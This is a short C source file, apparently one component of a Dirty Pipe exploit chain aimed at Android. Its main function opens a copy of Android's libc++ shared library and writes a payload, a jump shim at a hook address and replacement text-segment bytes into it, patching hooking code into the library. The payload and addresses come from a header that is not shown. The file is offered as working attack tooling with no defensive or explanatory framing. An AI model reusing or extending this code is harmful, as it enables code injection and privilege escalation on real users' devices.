#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <errno.h>
#include <sys/prctl.h>

#include "dirtypipe.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

__attribute__((noreturn))
void panic(const char *msg) {
	fprintf(stderr, "%s", msg);
	exit(1);
}

#define LOG(fmt, ...) do { \
  printf(fmt "\n", ##__VA_ARGS__); \
  } while(0)

#define FAIL() do { LOG("Failed on %s:%d\n", __func__, __LINE__); exit(1); } while(0)

#define SYSCHK(x) ({                  \
  __typeof__(x) __res = (x);          \
  if (__res == (__typeof__(x))-1) {   \
    LOG("SYSCHK(" #x ") = %d\n", __res);\
    int error_val = errno;            \
    LOG("errno: %d\n", error_val);    \
    exit(1);                          \
  }                                   \
  __res;                              \
})

int main() {
  int fd = SYSCHK(open("android_libc++_new.so", O_WRONLY));
  lseek(fd, PAYLOAD_ADDR, SEEK_SET);
  write(fd, PAYLOAD, sizeof(PAYLOAD));
  lseek(fd, HOOK_ADDR, SEEK_SET);
  write(fd, JMP_SHIM, sizeof(JMP_SHIM));
  lseek(fd, TEXT_SEGMENT_OFFSET, SEEK_SET);
  write(fd, TEXT_SEGMENT_PAYLOAD, sizeof(TEXT_SEGMENT_PAYLOAD));
  close(fd);
}
